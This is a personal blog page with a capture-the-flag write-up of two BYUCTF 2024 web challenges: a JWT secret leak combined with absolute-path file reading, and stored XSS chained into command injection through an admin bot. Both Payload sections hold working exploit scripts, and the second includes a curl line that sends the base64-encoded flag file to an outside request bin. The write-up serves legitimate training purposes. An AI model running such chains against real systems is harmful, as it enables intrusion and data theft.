<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="[Web] randomDescription I’ve only had the time to make the API, but it should be working properly. Please make sure it’s secure. If you can read any file you want, I’ll make sure to reward you!   Anal">
<meta property="og:type" content="article">
<meta property="og:title" content="BYUCTF2024">
<meta property="og:url" content="https://chuajianshen.github.io/2024/05/17/BYUCTF2024/index.html">
<meta property="og:site_name" content="Shen">
<meta property="og:description" content="[Web] randomDescription I’ve only had the time to make the API, but it should be working properly. Please make sure it’s secure. If you can read any file you want, I’ll make sure to reward you!   Anal">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-05-17T15:22:12.000Z">
<meta property="article:modified_time" content="2024-05-19T03:07:35.756Z">
<meta property="article:author" content="Shen">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/puck.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/puck.ico" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/puck.ico">
        
      
    
    <!-- title -->
    <title>BYUCTF2024</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/06/30/UIU2024/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/05/14/CRTP-2024/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&text=BYUCTF2024"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&title=BYUCTF2024"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&is_video=false&description=BYUCTF2024"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BYUCTF2024&body=Check out this article: https://chuajianshen.github.io/2024/05/17/BYUCTF2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&title=BYUCTF2024"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&title=BYUCTF2024"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&title=BYUCTF2024"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&title=BYUCTF2024"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&name=BYUCTF2024&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&t=BYUCTF2024"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-random"><span class="toc-number">1.</span> <span class="toc-text">[Web] random</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.2.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload"><span class="toc-number">1.4.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Not-a-Problem"><span class="toc-number">2.</span> <span class="toc-text">[Web] Not a Problem</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description-1"><span class="toc-number">2.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-1"><span class="toc-number">2.2.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-1"><span class="toc-number">2.4.</span> <span class="toc-text">Payload</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        BYUCTF2024
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Shen</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-05-17T15:22:12.000Z" class="dt-published" itemprop="datePublished">17-05-2024</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Web-random"><a href="#Web-random" class="headerlink" title="[Web] random"></a>[Web] random</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>I’ve only had the time to make the API, but it should be working properly. Please make sure it’s secure. If you can read any file you want, I’ll make sure to reward you! </p>
</blockquote>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Before each request, we must have a valid JWT cookie to authenticate which is signed with the APP_SECRET.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">time_started = round(time.time())</span><br><span class="line">APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    payload = jwt.decode(session, APP_SECRET, algorithms=[&#x27;HS256&#x27;])</span><br><span class="line">    if payload[&#x27;userid&#x27;] != 0:</span><br><span class="line">        abort(401)</span><br><span class="line">except:</span><br><span class="line">    abort(Response(f&#x27;&lt;h1&gt;NOT AUTHORIZED&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; This system has been up for &#123;round(time.time()-time_started)&#125; seconds fyi :wink:&#x27;, status=403))</span><br></pre></td></tr></table></figure>

<p>However, the APP_SECRET can be found as the time since the server was ran is given if we do not have a valid JWT in the except block.</p>
<p>After finding out the secret, we can request files through the &#x2F;api&#x2F;file route. The route checks for path traversal by checking if ‘..&#x2F;‘ is in the filename and recursively strips it. We are unable to read arbitrary files for now.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/api/file&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def get_file():</span><br><span class="line">    filename = request.args.get(&#x27;filename&#x27;, None)</span><br><span class="line"></span><br><span class="line">    if filename is None:</span><br><span class="line">        abort(Response(&#x27;No filename provided&#x27;, status=400))</span><br><span class="line"></span><br><span class="line">    # prevent directory traversal</span><br><span class="line">    while &#x27;../&#x27; in filename:</span><br><span class="line">        filename = filename.replace(&#x27;../&#x27;, &#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    # get file contents</span><br><span class="line">    return open(os.path.join(&#x27;files/&#x27;, filename),&#x27;rb&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>The flag is stored in the home directory of the ctf user which is designed to be random, thus hinting on RCE or LFI.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ARG directory=/in_prod_this_is_random</span><br><span class="line"></span><br><span class="line">RUN mkdir $&#123;directory&#125;</span><br><span class="line">RUN useradd -M -d $&#123;directory&#125; ctf</span><br></pre></td></tr></table></figure>

<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>When os.path.join is used to return the current directory files, it can resolve an absolute path if given one such as:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; a = os.path.join(&quot;/files&quot;, &quot;/etc/passwd&quot;)</span><br><span class="line">&gt;&gt;&gt; print(a)</span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can use this to request &#x2F;etc&#x2F;passwd and find the home directory of the ctf user. Using the home directory, we can request ${directory}&#x2F;flag.txt</p>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import hashlib, time, jwt, requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">URL = &quot;https://random.chal.cyberjousting.com&quot;</span><br><span class="line"></span><br><span class="line">def get_jwt():</span><br><span class="line"></span><br><span class="line">    cookies = &#123;&quot;session&quot;:&quot;a&quot;&#125;</span><br><span class="line"></span><br><span class="line">    r  = requests.get(URL, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    current = round(time.time())</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(r.text, &#x27;html.parser&#x27;)</span><br><span class="line"></span><br><span class="line">    uptime_text = soup.get_text()</span><br><span class="line"></span><br><span class="line">    uptime_digits = &#x27;&#x27;.join(filter(str.isdigit, uptime_text))</span><br><span class="line">    </span><br><span class="line">    server_time = current - int(uptime_digits)</span><br><span class="line">    </span><br><span class="line">    secret = hashlib.sha256(str(server_time).encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    print(f&#x27;[*] Server secret found &#123;secret&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    encoded_jwt = jwt.encode(&#123;&quot;userid&quot;: 0&#125;, secret, algorithm=&quot;HS256&quot;)</span><br><span class="line"></span><br><span class="line">    return encoded_jwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_flag():</span><br><span class="line"></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        &quot;session&quot;: get_jwt()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r2 = requests.get(URL + &#x27;/api/file?filename=/etc/passwd&#x27;, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(r2.text, &#x27;html.parser&#x27;)</span><br><span class="line"></span><br><span class="line">    lines = soup.get_text().split(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    for line in lines:</span><br><span class="line">        if line.strip():  </span><br><span class="line">            parts = line.split(&#x27;:&#x27;)</span><br><span class="line">            if parts[0] == &#x27;ctf&#x27;:</span><br><span class="line">                home_directory = parts[5]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(f&#x27;[*] Found home directory: &#123;home_directory&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    r3 = requests.get(URL + f&#x27;/api/file?filename=&#123;home_directory&#125;/flag.txt&#x27;, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    return r3.text</span><br><span class="line"></span><br><span class="line">print(get_flag())</span><br><span class="line"></span><br><span class="line">byuctf&#123;expl01t_chains_involve_multiple_exploits_in_a_row&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Web-Not-a-Problem"><a href="#Web-Not-a-Problem" class="headerlink" title="[Web] Not a Problem"></a>[Web] Not a Problem</h1><h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>Bug bounty hunter: “There’s command injection here” Triager: “But it’s only accessible by admins so it’s nOt A vUlNeRaBiLiTy” You: bet </p>
</blockquote>
<h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>There is a command injection route defined, but it is only accessible to the admin bot because of its secret cookie.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># current date</span><br><span class="line">@app.route(&#x27;/api/date&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def get_date():</span><br><span class="line">    # get &quot;secret&quot; cookie</span><br><span class="line">    cookie = request.cookies.get(&#x27;secret&#x27;)</span><br><span class="line"></span><br><span class="line">    # check if cookie exists</span><br><span class="line">    if cookie == None:</span><br><span class="line">        return &#x27;&#123;&quot;error&quot;: &quot;Unauthorized&quot;&#125;&#x27;</span><br><span class="line">    </span><br><span class="line">    # check if cookie is valid</span><br><span class="line">    if cookie != SECRET:</span><br><span class="line">        return &#x27;&#123;&quot;error&quot;: &quot;Unauthorized&quot;&#125;&#x27;</span><br><span class="line">    </span><br><span class="line">    modifier = request.args.get(&#x27;modifier&#x27;,&#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">    return &#x27;&#123;&quot;date&quot;: &quot;&#x27;+subprocess.getoutput(&quot;date &quot;+modifier)+&#x27;&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>We cannot directly send the url to the bot for command injection as it filters the &#x2F;date endpoint.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (url.includes(&quot;date&quot;) || url.includes(&quot;%&quot;)) &#123;</span><br><span class="line">        res.send(&#x27;Error: &quot;date&quot; is not allowed in the URL&#x27;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>However, there is a functionality to update stats and request for these stats on the website as defined below:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># get stats</span><br><span class="line">@app.route(&#x27;/api/stats/&lt;string:id&gt;&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def get_stats(id):</span><br><span class="line">    for stat in stats:</span><br><span class="line">        if stat[&#x27;id&#x27;] == id:</span><br><span class="line">            return str(stat[&#x27;data&#x27;])</span><br><span class="line">        </span><br><span class="line">    return &#x27;&#123;&quot;error&quot;: &quot;Not found&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># add stats</span><br><span class="line">@app.route(&#x27;/api/stats&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def add_stats():</span><br><span class="line">    try:</span><br><span class="line">        username = request.json[&#x27;username&#x27;]</span><br><span class="line">        high_score = int(request.json[&#x27;high_score&#x27;])</span><br><span class="line">    except:</span><br><span class="line">        return &#x27;&#123;&quot;error&quot;: &quot;Invalid request&quot;&#125;&#x27;</span><br><span class="line">    </span><br><span class="line">    id = str(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">    stats.append(&#123;</span><br><span class="line">        &#x27;id&#x27;: id,</span><br><span class="line">        &#x27;data&#x27;: [username, high_score]</span><br><span class="line">    &#125;)</span><br><span class="line">    return &#x27;&#123;&quot;success&quot;: &quot;Added&quot;, &quot;id&quot;: &quot;&#x27;+id+&#x27;&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>We can control the username parameter and make it return a XSS payload when requesting it in the &#x2F;api&#x2F;stats&#x2F;<a href="string:id">string:id</a> endpoint.</p>
<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Write an XSS payload in the username and ask the bot to request our payload. The XSS will request the command injection endpoint and exfiltrate the flag.</p>
<h2 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">URL = &quot;https://not-a-problem.chal.cyberjousting.com/&quot;</span><br><span class="line">BOT_URL = &quot;https://not-a-problem-admin.chal.cyberjousting.com/visit&quot;</span><br><span class="line">REQUEST_BIN = &quot;https://m53.requestcatcher.com&quot;</span><br><span class="line"></span><br><span class="line">def post_payload(payload):</span><br><span class="line"></span><br><span class="line">    payload = f&quot;&lt;script&gt;eval(atob(&#x27;&#123;payload.decode(&#x27;utf-8&#x27;)&#125;&#x27;))&lt;/script&gt;&quot;</span><br><span class="line"></span><br><span class="line">    json = &#123;</span><br><span class="line">        &quot;username&quot; : payload,</span><br><span class="line">        &quot;high_score&quot;: 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(URL + &#x27;/api/stats&#x27;, json=json)</span><br><span class="line"></span><br><span class="line">    id = r.json()</span><br><span class="line"></span><br><span class="line">    print(f&#x27;[*] Sent payload and got this ID &#123;id&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    return id[&#x27;id&#x27;]</span><br><span class="line"></span><br><span class="line">def send_id(id):</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;path&quot; : quote(f&quot;api/stats/&#123;id&#125;&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    r = requests.post(BOT_URL, data=data)</span><br><span class="line"></span><br><span class="line">    print(f&#x27;[*] Sent ID &#123;id&#125; to BOT&#x27;)</span><br><span class="line">    print(f&#x27;[*] Check request bin&#x27;)</span><br><span class="line"></span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(f&quot;window.location=&#x27;http://127.0.0.1:1337/api/date?modifier=;curl &#123;REQUEST_BIN&#125;/?f=`cat /ctf/flag.txt | base64` &#x27;&quot;.encode())</span><br><span class="line"></span><br><span class="line">id = post_payload(payload)</span><br><span class="line"></span><br><span class="line">send_id(id)</span><br><span class="line"></span><br><span class="line">byuctf&#123;&quot;not_a_problem&quot;_YEAH_RIGHT&#125;</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-random"><span class="toc-number">1.</span> <span class="toc-text">[Web] random</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.2.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload"><span class="toc-number">1.4.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Not-a-Problem"><span class="toc-number">2.</span> <span class="toc-text">[Web] Not a Problem</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description-1"><span class="toc-number">2.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-1"><span class="toc-number">2.2.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-1"><span class="toc-number">2.4.</span> <span class="toc-text">Payload</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&text=BYUCTF2024"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&title=BYUCTF2024"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&is_video=false&description=BYUCTF2024"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BYUCTF2024&body=Check out this article: https://chuajianshen.github.io/2024/05/17/BYUCTF2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&title=BYUCTF2024"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&title=BYUCTF2024"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&title=BYUCTF2024"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&title=BYUCTF2024"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&name=BYUCTF2024&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://chuajianshen.github.io/2024/05/17/BYUCTF2024/&t=BYUCTF2024"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
